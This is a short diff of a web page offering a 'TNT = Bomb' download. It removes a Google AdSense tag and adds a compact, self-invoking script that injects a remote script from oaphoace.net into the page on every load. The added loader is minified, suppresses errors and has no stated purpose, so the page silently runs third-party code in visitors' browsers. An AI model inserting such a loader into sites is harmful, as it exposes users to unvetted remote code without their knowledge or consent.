@@ -36,9 +36,9 @@
 ## TNT = Bomb
 >[Download](./tntbomb.html)
 <head>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5850853284840895"
-     crossorigin="anonymous"></script>
 </head>
+
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('oaphoace.net',5333655,document.createElement('script'))</script>
 
 
 
